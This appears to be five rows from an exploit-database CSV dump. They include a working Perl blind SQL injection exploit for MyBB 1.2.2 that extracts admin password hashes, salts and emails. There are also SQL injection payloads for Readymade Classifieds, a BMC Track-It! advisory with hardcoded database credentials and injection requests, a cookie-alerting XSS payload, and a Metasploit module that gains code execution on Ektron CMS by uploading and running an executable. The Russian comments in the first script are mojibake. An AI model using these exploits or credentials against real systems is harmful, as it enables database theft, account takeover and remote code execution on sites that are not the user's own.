3719,"MyBulletinBoard (MyBB) 1.2.2 - 'CLIENT-IP' SQL Injection #!/usr/bin/perl ########################################################### #########################  LOGO  ########################## ########################################################### #     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     # #                                                         # #       [u]used:   SQL CLIENT_IP vulnerability            # #       [!]need:   Mysql >= 4.1                           # #       [w]work:   blind sql-inj                          # #       [g]google: Powered By MyBB                        # #                                                         # #               coded by Elekt (antichat.ru)              # ########################################################### #######################  Coments  ######################### ########################################################### # # ÐžÐ¿Ð¸ÑÐ°Ð½Ð¸Ðµ: # Ð Ð°Ð±Ð¾Ñ‚Ð° ÑÐºÑÐ¿Ð»Ð¾Ð¹Ñ‚Ð° Ð¾ÑÐ½Ð¾Ð²Ð°Ð½Ð° Ð½Ð° sql-Ð¸Ð½ÑŠÐµÐºÑ†Ð¸Ð¸ Ð² HTTP_CLIENT_IP. # ÐÐµÐ°Ð²Ñ‚Ð¾Ñ€Ð¸Ð·Ð¾Ð²Ð°Ð½Ð½Ñ‹Ð¹ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ Ð¼Ð¾Ð¶ÐµÑ‚ Ð²Ñ‹Ð¿Ð¾Ð»Ð½Ð¸Ñ‚ÑŒ Ð¿Ñ€Ð¾Ð¸Ð·Ð²Ð¾Ð»ÑŒÐ½Ñ‹Ð¹ SQL-Ð·Ð°Ð¿Ñ€Ð¾Ñ Ð² Ð±Ð°Ð·Ñƒ. # # http://host.com/mybb/index.php # MySQL error: 1064 # You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"">'' at line 3 # Query: DELETE FROM mybb_sessions WHERE ip=''"">' #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # Ð­Ñ‚Ð¾ Ð½Ð¾Ð²Ð°Ñ Ð²ÐµÑ€ÑÐ¸Ñ ÑÐºÑÐ¿Ð»Ð¾Ð¹Ñ‚Ð°.  # ÐœÐ½Ð¾Ð¹ Ð±Ñ‹Ð» Ð½Ð°Ð¹Ð´ÐµÐ½ ÑÐ¿Ð¾ÑÐ¾Ð± Ð¾Ñ‚ÐºÐ°Ð·Ð°Ñ‚ÑŒÑÑ Ð¾Ñ‚ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ð½Ð¸Ñ benchmark, # Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐµÑ‚ ÑƒÑÐºÐ¾Ñ€Ð¸Ñ‚ÑŒ Ñ€Ð°Ð±Ð¾Ñ‚Ñƒ ÑÐºÑÐ¿Ð»Ð¾Ð¹Ñ‚Ð°, Ð¿Ð¾Ð²Ñ‹ÑÐ¸Ñ‚ÑŒ Ð½Ð°Ð´ÐµÐ¶Ð½Ð¾ÑÑ‚ÑŒ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð½Ñ‹Ñ… Ð´Ð°Ð½Ð½Ñ‹Ñ…. #  # Ð Ð°Ð±Ð¾Ñ‚Ð° ÑÐºÑÐ¿Ð»Ð¾Ð¹Ñ‚Ð° Ð¾ÑÐ½Ð¾Ð²Ð°Ð½Ð° Ð½Ð° Ð¿Ñ€Ð¾Ð²Ð¾Ñ†Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ð¸ ""Subquery returns more than 1 row"" Ð¾ÑˆÐ¸Ð±ÐºÐ¸, # Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐµÑ‚ Ð¿Ñ€Ð¾Ð¸Ð·Ð²ÐµÑÑ‚Ð¸ blind-sql-inj:  #  # mybb # match: ""Subquery returns more than 1 row"" # CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>1,password,uid))<5)/* # CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))>254,password,uid))<5)/* #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #  # ÐŸÐ¾Ð»ÐµÐ·Ð½Ñ‹Ðµ Ñ‚Ð°Ð±Ð»Ð¸Ñ†Ñ‹ Ð¸ Ð¿Ð¾Ð»Ñ: # mybb_1.2.1: mybb_users - uid,username,password,salt,email,loginkey,icq,aim,regip #  # ÐÐ»Ð³Ð¾Ñ€Ð¸Ñ‚Ð¼ Ð³ÐµÐ½ÐµÑ€Ð°Ñ†Ð¸Ð¸ Ð¿Ð°Ñ€Ð¾Ð»ÐµÐ¹ Ð² mybb: # md5(md5($salt).md5($password)) # generate_salt{return random_str(8);} #  ########################################################### #########################  init  ########################### ###########################################################  use LWP::UserAgent;  $sock = LWP::UserAgent->new();  $|=1;  &header();   ########################################################### #######################  Options  ######################### ###########################################################  if (@ARGV < 2) {&info(); exit();}  $host = $ARGV[0]; # ÑÐµÑ€Ð²Ð°Ðº $dir = $ARGV[1];  # Ð´Ð¸Ñ€Ð° Ñ Ñ„Ð¾Ñ€ÑƒÐ¼Ð¾Ð¼ $uid = 2;         # Ð°ÐºÐº Ð°Ð´Ð¼Ð¸Ð½Ð° Ð¿Ð¾ Ð´ÐµÑ„Ð°ÑƒÐ»Ñ‚Ñƒ $uid = $ARGV[2] if $ARGV[2];  $debug = 0;            # Ñ€ÐµÐ¶Ð¸Ð¼ Ð¾Ñ‚Ð»Ð°Ð´ÐºÐ¸ $space = ""char(58)"";   # Ñ€Ð°Ð·Ð´ÐµÐ»Ð¸Ñ‚ÐµÐ»ÑŒ ÑÑ‚Ð¾Ð»Ð±Ñ†Ð¾Ð² #$search = ""password"";  # Ñ‡Ñ‚Ð¾ Ð±Ñ€ÑƒÑ‚Ð¸Ð¼, ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ð¾... #$search = ""concat(uid,$space,password,$space,salt)""; # uid:password:salt $search = ""concat(uid,$space,username,$space,password,$space,salt,$space,email)""; # uid:username:password:salt:email $search = $ARGV[3] if $ARGV[3];  # $presetascii - Ð´Ð¸Ð°Ð¿Ð°Ð·Ð¾Ð½ ascii-ÐºÐ¾Ð´Ð¾Ð² Ð´Ð»Ñ Ð±Ñ€ÑƒÑ‚Ð° Ð²ÐµÑ€Ð¾ÑÑ‚Ð½Ñ‹Ñ… Ð´Ð°Ð½Ð½Ñ‹Ñ… # $presetascii = ""0123456789abcdef""; # $presetascii = ""0123456789"" # $presetascii = ""abcdefghijklmnopqrstuvwxyz"" # $presetascii = ""0123456789abcdefghijklmnopqrstuvwxyz"" # $presetascii = ""Ð°Ð±Ð²Ð³Ð´ÐµÑ‘Ð¶Ð·Ð¸Ð¹ÐºÐ»Ð¼Ð½Ð¾Ð¿Ñ€ÑÑ‚ÑƒÑ„Ñ…Ñ†Ñ‡ÑˆÑ‰ÑŠÑ‹ÑŒÑÑŽÑ""); # Ñ†Ð¸ÐºÐ», Ð´Ð»Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾Ñ‚Ñ‹ Ð·Ð°Ð´Ð°Ñ‘Ñ‚ Ð²ÑÐµ ÑÐ¸Ð¼Ð²Ð¾Ð»Ñ‹ Ð´Ð»Ñ Ð¿ÐµÑ€ÐµÐ±Ð¾Ñ€Ð°  $i=0; while($i<=255){ $presetascii.=chr($i);$i++; }  ########################################################### #########################  go!  ########################### ###########################################################   $time=localtime; &log (""[i] Start time  $time\n""); &log (""[+] HOST \""$host\""\n""); &log (""[+] DIR  \""$dir\""\n""); &log (""[+] UID  \""$uid\""\n""); &log (""[+] Search  \""$search\""\n"");  ########################################################### ###### detecting vulnerability and searching prefix ####### ###########################################################  # detecting vulnerability and searching prefix &log (""[~] Testing forum vulnerabile... ""); $q = """"; $prefix=query($q,$host,$dir); if($prefix ne ""not_find""){&log (""Yes! Forum vulnerable!\n"");sleep(1);&log (""[~] Searching prefix..."");sleep(1);&log ("" prefix find - \""$prefix\""\n""); } else      {      &log (""Sorry. Forum unvulnerable\n""); 	 &footer();      exit();     }   ########################################################### #####################   brutforce   ####################### ###########################################################  # brutforce &log (""[~] Brutforce begin! it may take some time, plz, wait...\n""); $kol=1; for ($control=0;$control==0;){    &log(""\n---------------- Simvol $kol ----------------\n\n"") if $debug;    $amin = 1;    $amax = length($presetascii)-1;    $n=0;     # ÐµÑÐ»Ð¸ Ð´Ð¸Ð°Ð¿Ð°Ð·Ð¾Ð½ 4 Ð¸ Ð±Ð¾Ð»ÐµÐµ ÑÐ¸Ð¼Ð²Ð¾Ð»Ð¾Ð², Ð¿ÐµÑ€ÐµÐ¾Ð¿Ñ€ÐµÐ´ÐµÐ»ÑÐµÐ¼ Ð´Ð¸Ð°Ð¿Ð°Ð·Ð¾Ð½, ÑƒÐ¼ÐµÐ½ÑŒÑˆÐ°Ñ ÐµÐ³Ð¾ Ð² 2 Ñ€Ð°Ð·Ð°    while (($amax-$amin)>=4){         print (""-> Try "".ord(substr($presetascii,$amin,1))."" .. "".ord(substr($presetascii,$amax,1))."" -> "") if $debug;; 	#$q = ""or 1=if((ascii(substring((select "".$search."" from "".$prefix.""users where uid='"".$uid.""'),"".$kol."",1))>="".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).""),1,benchmark("".$benchmark."",md5(char(114,115,116))))/*""; 	$q = ""or 1=(select null from "".$prefix.""users where length(if((ascii(substring((select "".$search."" from "".$prefix.""users where uid='"".$uid.""'),"".$kol."",1))>="".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).""),password,uid))<5)/*"";         if (query($q,$host,$dir) eq ""not_find"") {            print (""Char>="".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).""\n"") if $debug;;           $amin=int($amax-($amax-$amin)/2); }         else {            print (""Char<"".ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).""\n"") if $debug;;           $amax=int($amax-($amax-$amin)/2); };    }        # ÐµÑÐ»Ð¸ Ð´Ð¸Ð°Ð¿Ð°Ð·Ð¾Ð½ Ð¼ÐµÐ½ÐµÐµ 4-Ñ… ÑÐ¸Ð¼Ð²Ð¾Ð»Ð¾Ð², Ñ‚Ð¾ Ð¿ÐµÑ€ÐµÑ…Ð¾Ð´Ð¸Ð¼ Ðº Ð¿ÐµÑ€ÐµÐ±Ð¾Ñ€Ñƒ    while ($amin<=$amax) {      print (""-> Try "".ord(substr($presetascii,$amin,1))."" ->"") if $debug;;      # Ð¿Ñ€Ð¾Ð²ÐµÑ€ÑÐµÐ¼ Ð¾Ñ‚Ð²ÐµÑ‚ ÑÐºÑ€Ð¸Ð¿Ñ‚Ð°, ÐµÑÐ»Ð¸ Ð¾Ñ‚Ð²ÐµÑ‚ Ð¿Ð¾Ð»Ð¾Ð¶Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹Ð¹ Ñ‚Ð¾ Ð²Ñ‹Ð²Ð¾Ð´Ð¸Ð¼ ÑÐ¸Ð¼Ð²Ð¾Ð» Ð¸ Ð¸Ñ‰ÐµÐ¼ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ ÑÐ¸Ð¼Ð²Ð¾Ð» Ð² ÑÐ»Ð¾Ð²Ðµ, ÐµÑÐ»Ð¸ Ð½Ðµ Ð¾Ð¿Ñ€ÐµÐ´ÐµÐ»ÑÐµÐ¼ ÑÐ¸Ð¼Ð²Ð¾Ð» - Ð²Ñ‹Ñ…Ð¾Ð´. 	#$q = ""or 1=if((ascii(substring((select "".$search."" from "".$prefix.""users where uid='"".$uid.""'),"".$kol."",1))="".ord(substr($presetascii,$amin,1)).""),1,benchmark("".$benchmark."",md5(char(114,115,116))))/*""; 	$q = ""or 1=(select null from "".$prefix.""users where length(if((ascii(substring((select "".$search."" from "".$prefix.""users where uid='"".$uid.""'),"".$kol."",1))="".ord(substr($presetascii,$amin,1)).""),password,uid))<5)/*"";      if (query($q,$host,$dir) eq ""not_find"") {           &log ("" FOUND!\n-> Ascii: "".ord(substr($presetascii,$amin,1)).""\n-> Char: \"""".substr($presetascii,$amin,1).""\""\n"") if $debug;;            &log (""[$kol] Find - ascii:\"""".ord(substr($presetascii,$amin,1)).""\"", char:\"""".substr($presetascii,$amin,1).""\""\n"") if !$debug;           $rezultat_char = $rezultat_char.substr($presetascii,$amin,1);            $rezultat_ascii = $rezultat_ascii.ord(substr($presetascii,$amin,1))."","";            $amin=$amax+1;$control=1;}         else { print ("" NO =(\n"") if $debug; $amin=$amin+1; };    }    if ($control==0) {       if($amin!=5){$rezultat_char = $rezultat_char.""?"";$rezultat_ascii = $rezultat_ascii.""?,"";                   &log (""[$kol] Error! not found =( $amin\n"") if !$debug;                   &log ("" Error! not found =(\n"") if $debug;      }else{$control=1;}    }else {$control=0;}    $kol++; }  print (""\n[!] Yyyy-a-a-a-h-h-uuu!!!\n""); &log (""\n[*] Char: $rezultat_char\n[*] Ascii: $rezultat_ascii\n""); $time=localtime; &log (""\n[i] Finish time  $time\n\n"");   &footer(); exit();  ########################################################### ########################  log   ########################## ########################################################### # Ð»Ð¾Ð³ sub log($)     {      open(RES,"">>"".$host.""_log.txt"") || die ""[-] Cannot open log file!""; ## ÐžÑ‚ÐºÑ€Ñ‹Ð²Ð°ÐµÐ¼ Ð»Ð¾Ð³ Ð´Ð»Ñ Ð´Ð¾Ð·Ð°Ð¿Ð¸ÑÐ¸      print (""$_[0]"");      print RES (""$_[0]"");      close(RES);     }  ########################################################### ######################## footer  ########################## ########################################################### # ÑÐ¿Ð¸Ð»Ð¾Ð³ sub footer()     {      print (""[G] Greets: Elekt (antichat.ru), 1dt.w0lf (rst/ghc)\n"");      print (""[L] Visit : www.antichat.ru\n"");     }   ########################################################### ######################## header  ########################## ########################################################### # Ñ…Ð¸Ð´ÐµÑ€ sub header() { print q( =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_= +     Mybb <= 1.2.2 Remote SQL Injecton Exploit v.2.0     + +                                                         + +       [i]used:   SQL CLIENT_IP vulnerability            + +       [!]need:   Mysql >= 4.1                           + +       [w]work:   blind sql-inj                          + +       [i]google: Powered By MyBB                        + +                                                         + +               coded by Elekt (antichat.ru)              + =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_+ ); }   ########################################################### ########################  info   ########################## ########################################################### # Ð¸Ð½Ñ„Ð¾ sub info() {  print q( [i] Usage:   perl mybb122exp.pl [host] [/dir/] [uid] [search] *-required   *[host] - target host without http://   *[/dir/] - installed forums dir    [uid] - user uid (default=2)    [search] - data (uid:username:password:salt:email) 	    [E] Example: perl mybb122exp.pl host.com /forum/ 1 password  [i] mybb: md5(md5($salt).md5($password))   ); }  ########################################################### #######################  sender   ######################### ########################################################### # Ð¿Ñ€Ð¾Ñ†ÐµÐ´ÑƒÑ€Ð° Ð¿Ñ€Ð¸ÐµÐ¼Ð°\Ð¿Ð¾ÑÑ‹Ð»ÐºÐ¸ Ð´Ð°Ð½Ð½Ñ‹Ñ… sub query()     {      #&log (""\n\n$q\n\n"") if $debug;      my($q,$host,$dir) = @_;      $res = $sock->get(""http://"".$host.$dir.""index.php"",'USER_AGENT'=>'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)','CLIENT_IP'=>""' "".$q);       if($res->is_success)         {              if($res->as_string =~ /FROM (.*)sessions/) { return $1; } else {return ""not_find"";}         }      else{&log (""\n[!] Connection to $host FAILED! EXIT\n""); exit;}     }  # milw0rm.com [2007-04-12]",remote,webapps,1
43212,"Readymade Classifieds Script 1.0 - SQL Injection # # # # #  # Exploit Title: Readymade Classifieds Script 1.0 - SQL Injection # Dork: N/A # Date: 02.12.2017 # Vendor Homepage: http://www.scubez.net/ # Software Link: http://www.posty.in/index.html # Demo: http://www.posty.in/readymade-classifieds-demo.html # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) #  # http://localhost/[PATH]/listings.php?catid=[SQL] #  # -1++/*!08888UNION*/((/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)))--+- #  # Parameter: catid (GET) #     Type: boolean-based blind #     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) #     Payload: catid=-7326' OR 9205=9205# #  #     Type: AND/OR time-based blind #     Title: MySQL >= 5.0.12 AND time-based blind #     Payload: catid=' AND SLEEP(5)-- tCbs # 	 # 2) #  # http://localhost/[PATH]/ads-details.php?ID=[SQL] #  # -265++/*!08888UNION*/(/*!08888SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26))--+- #  # Parameter: ID (GET) #     Type: boolean-based blind #     Title: AND boolean-based blind - WHERE or HAVING clause #     Payload: ID=265 AND 4157=4157 #  #     Type: AND/OR time-based blind #     Title: MySQL >= 5.0.12 AND time-based blind #     Payload: ID=265 AND SLEEP(5) #  #     Type: UNION query #     Title: Generic UNION query (NULL) - 26 columns #     Payload: ID=-5939 UNION ALL SELECT NULL,NULL,CONCAT(0x716a626271,0x664f68565771437a5444554e794f547462774e65574f43616b767945464c416d524b646f48675a67,0x71787a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZIaY #  # Etc.. # # # # #      http://server/listings.php?catid=-1++/*!08888UNION*/((/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)))--+-  http://server/ads-details.php?ID=-265++/*!08888UNION*/(/*!08888SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26))--+-",remote,webapps,1
34924,"BMC Track-It! - Multiple Vulnerabilities >> Multiple critical vulnerabilities in BMC Track-It! >> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security =================================================================================  The application exposes several .NET remoting services on port 9010. .NET remoting is a RMI technology similar to Java RMI or CORBA which allows you to invoke methods remotely and retrieve their result. In BMC Track-It!, the .NET remoting services are unauthenticated and unencrypted, meaning that anyone can invoke all the exposed methods remotely.  It is possible to capture traffic and decode the packet format by looking at the (incomplete) Microsoft .NET remoting specifications. Using these techniques, two Metasploit modules were produced: one is an exploit module that can upload arbitrary files to the web root and achieve remote code execution, and the other is an auxiliary module that allows retrieval of the SQL and domain administrator credentials.  Three other vulnerabilities (SQL injection, arbitrary file download and hardcoded database credentials) were also discovered.  A special thanks to CERT for handling the communication to BMC and the disclosure of these vulnerabilities. These issues are tracked by CERT as VU#121036 (http://www.kb.cert.org/vuls/id/121036).   >> Background on the affected product: ""Track-It! IT Help Desk Software includes everything you need for IT Help Desk management. Full featured, easy to deploy, easy to use and cost-effective, Track-It! Help Desk is designed specifically with the needs of small to mid-sized organizations in mind. Over 55,000 organizations worldwide have trusted Track-It! for their IT help desk ticketing and asset management needs. Track-It! IT Help Desk Software includes, helpdesk, work order ticket tracking, incident and problem management, knowledge management, service level management, asset management, change management, software license management, mobile device access, end-user self-service and more. Track-It! Help Desk delivers the strength of ITSM best practices with the simplicity of smooth installation and quick configuration to provide instant return on your investment.""   >> Technical details: #1 Domain administrator and SQL server user credentials disclosure (unauthenticated) Versions affected: 9 to 11.3+ (version 8 might be affected, but could not be confirmed) CVE-2014-4872  The application exposes an unauthenticated .NET remoting configuration service (ConfigurationService) on port 9010.  This service contains a method that can be used to retrieve a configuration file that contains the application database name, username and password as well as the domain administrator username and password. These are encrypted with a fixed key and IV (""NumaraIT"") using the DES algorithm. The domain administrator username and password can only be obtained if the Self-Service component is enabled, which is the most common scenario in enterprise deployments. A Metasploit module that exploits this vulnerability has been released.   #2 Remote code execution via file upload (unauthenticated) Versions affected: 8 to 11.3+ CVE-2014-4872 (same as #1)  The application exposes an unauthenticated .NET remoting file storage service (FileStorageService) on port 9010.  This service contains a method that allows uploading a file to an arbitrary path on the machine that is running Track-It!. This can be used to upload a file to the web root and achieve code execution as NETWORK SERVICE or SYSTEM. A Metasploit module that exploits this vulnerability has been released.   #3 Blind SQL injection (authenticated) Versions affected: Unknown, at least 11.3 CVE-2014-4873  POST /TrackItWeb/Grid/GetData pagingMode=0&id=WebGrid.21&appFilters=[{""type"":""numeric"",""field"":""userid  = 51)) blag; $CREATE TABLE lol(lulz text);$ select woid from (select woid, row_number() over (ORDER BY woid) RowNumber from z$vTASKS_BROWSE -- "",""comparison"":""="",""value"":51}]  Accepts injection between the two $.   #4 Arbitrary file download (authenticated) Versions affected: Unknown, at least 11.3 CVE-2014-4874  GET /TrackItWeb/Attachment/Open?attachmentType=1&entityId=1337&entityGuid=aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&fileName=C:\boot.ini   #5 Hardcoded database credentials Versions affected: Unknown, at least from 8 to 11.3+  When installed with the built-in SQL Express, Track-It! uses the following hardcoded database credentials: Username: TrackIt80_1 Password: TI_DB_P@ssw0rd   >> Fix: UNFIXED - the vendor refused to acknowledge the vulnerabilities and did not respond to CERT. Block all communications from untrusted networks (e.g. the Internet) to ports 9010 to 9020; also block the SQL Express database port (default is 49159) if you are using the built-in database. Ensure you do not have any untrusted users with access to Track-It!.",remote,webapps,1
27467,ConfTool 1.1 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17231/info  ConfTool is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[path]/index.php?page=<script>alert(document.cookie)</script>,remote,webapps,1
23155,"Ektron 8.02 - XSLT Transform Remote Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core' require 'msf/core/exploit/file_dropper'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::EXE 	include Msf::Exploit::FileDropper  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Ektron 8.02 XSLT Transform Remote Code Execution', 			'Description'    => %q{ 					This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The 				vulnerability exists due to the insecure usage of XslCompiledTransform, using a 				XSLT controlled by the user. The module has been tested successfully on Ektron CMS 				8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK 				SERVICE privileges. 			}, 			'Author'         => [ 				'Unknown', # Vulnerability discovery, maybe Richard Lundeen from http://webstersprodigy.net/ ? 				'juan vazquez' # Metasploit module 			], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'CVE', '2012-5357'], 					[ 'URL', 'http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/' ], 					[ 'URL', 'http://technet.microsoft.com/en-us/security/msvr/msvr12-016' ] 				], 			'Payload'        => 				{ 					'Space'           => 2048, 					'StackAdjustment' => -3500 				}, 			'Platform'       => 'win', 			'Privileged'     => true, 			'Targets'        => 				[ 					['Windows 2003 SP2 / Ektron CMS400 8.02', { }], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Oct 16 2012' 		))  		register_options( 			[ 				OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60]), 				OptString.new('TARGETURI', [true, 'The URI path of the Ektron CMS', '/cms400min/']) 			], self.class ) 	end  	def check  		fingerprint = rand_text_alpha(5 + rand(5)) 		xslt_data = <<-XSLT <?xml version='1.0'?> <xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:user=""http://mycompany.com/mynamespace""> <msxsl:script language=""C#"" implements-prefix=""user""> <![CDATA[ public string xml() { return ""#{fingerprint}""; } ]]> </msxsl:script> <xsl:template match=""/""> <xsl:value-of select=""user:xml()""/> </xsl:template> </xsl:stylesheet> 		XSLT  		res = send_request_cgi( 			{ 				'uri'     => ""#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx"", 				'version' => '1.1', 				'method'  => 'POST', 				'ctype'   => ""application/x-www-form-urlencoded; charset=UTF-8"", 				'headers' => { 					""Referer"" => build_referer 				}, 				'vars_post'    => { 					""xml"" => rand_text_alpha(5 + rand(5)), 					""xslt"" => xslt_data 				} 			})  		if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/ 			return Exploit::CheckCode::Vulnerable 		end 		return Exploit::CheckCode::Safe 	end   	def on_new_session(session) 		if session.type == ""meterpreter"" 			session.core.use(""stdapi"") unless session.ext.aliases.include?(""stdapi"") 		end  		@dropped_files.delete_if do |file| 			win_file = file.gsub(""/"", ""\\\\"") 			if session.type == ""meterpreter"" 				begin 					windir = session.fs.file.expand_path(""%WINDIR%"") 					win_file = ""#{windir}\\Temp\\#{win_file}"" 					# Meterpreter should do this automatically as part of 					# fs.file.rm().  Until that has been implemented, remove the 					# read-only flag with a command. 					session.shell_command_token(%Q|attrib.exe -r ""#{win_file}""|) 					session.fs.file.rm(win_file) 					print_good(""Deleted #{file}"") 					true 				rescue ::Rex::Post::Meterpreter::RequestError 					print_error(""Failed to delete #{win_file}"") 					false 				end  			end 		end  	end  	def uri_path 		uri_path = target_uri.path 		uri_path << ""/"" if uri_path[-1, 1] != ""/"" 		uri_path 	end  	def build_referer 		if datastore['SSL'] 			schema = ""https://"" 		else 			schema = ""http://"" 		end  		referer = schema 		referer << rhost 		referer << "":#{rport}"" 		referer << uri_path 		referer 	end  	def exploit  		print_status(""Generating the EXE Payload and the XSLT..."") 		exe_data = generate_payload_exe 		exe_string = Rex::Text.to_hex(exe_data) 		exename = rand_text_alpha(5 + rand(5)) 		fingerprint = rand_text_alpha(5 + rand(5)) 		xslt_data = <<-XSLT <?xml version='1.0'?> <xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:msxsl=""urn:schemas-microsoft-com:xslt"" xmlns:user=""http://mycompany.com/mynamespace""> <msxsl:script language=""C#"" implements-prefix=""user""> <![CDATA[ public string xml() { char[] charData = ""#{exe_string}"".ToCharArray(); string fileName = @""C:\\windows\\temp\\#{exename}.txt""; System.IO.FileStream fs = new System.IO.FileStream(fileName, System.IO.FileMode.Create); System.IO.BinaryWriter bw = new System.IO.BinaryWriter(fs); for (int i = 0; i < charData.Length; i++) { 	bw.Write( (byte) charData[i]); } bw.Close(); fs.Close(); System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.FileName = @""C:\\windows\\temp\\#{exename}.txt""; p.Start(); return ""#{fingerprint}""; } ]]> </msxsl:script> <xsl:template match=""/""> <xsl:value-of select=""user:xml()""/> </xsl:template> </xsl:stylesheet> 		XSLT  		print_status(""Trying to run the xslt transformation..."") 		res = send_request_cgi( 			{ 				'uri'     => ""#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx"", 				'version' => '1.1', 				'method'  => 'POST', 				'ctype'   => ""application/x-www-form-urlencoded; charset=UTF-8"", 				'headers' => { 					""Referer"" => build_referer 				}, 				'vars_post'    => { 					""xml"" => rand_text_alpha(5 + rand(5)), 					""xslt"" => xslt_data 				} 			}) 		if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/ 			print_good(""Exploitation was successful"") 			register_file_for_cleanup(""#{exename}.txt"") 		else 			fail_with(Exploit::Failure::Unknown, ""There was an unexpected response to the xslt transformation request"") 		end  	end end",remote,remote,1
